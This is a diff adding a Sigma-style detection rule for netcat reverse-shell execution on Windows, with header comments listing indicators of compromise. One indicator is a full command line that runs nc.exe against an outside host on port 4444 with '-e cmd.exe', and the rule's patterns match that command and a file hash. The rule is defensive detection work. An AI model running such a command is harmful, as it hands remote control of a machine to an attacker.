@@ -1,0 +1,38 @@
+#Intel Analysis - Netcat execution to establish a revershe shell
+#IOC1 - Image: nc.exe
+#IOC2 - CommandLine: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe"
+#IOC3 - MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38
+
+#Rule Identification
+title: Reverse Shell Execution via Netcat
+status: experimental
+description: Detect the reverse shell execution via Netcat tool
+author: Mirza Mansoor Ali Baig
+date: 30/01/2024
+#Log Source
+log source:
+     product: windows
+     category: process_creation
+#Detection Description
+detection:
+    selection 1:
+       EventID: 1
+       Image|endswith:
+       - '\nc.exe'
+       CommandLine|Contains|all:
+       - 'huntmeplz.com'
+       - '-e cmd.exe'
+    selection 2:
+        Hashes|Contains:
+        - 523613A7B9DFA398CBD5EBD2DD0F4F38
+condition: selection 1 or selection 2
+#Rule Identification
+falsepositives:
+   - Legit Red Teamers testing for Reverse Shell execution
+level:
+   - Medium
+references:
+   - https://attack.mitre.org/techniques/T1059/
+tags:
+   - attack.execution
+   - attack.T1059
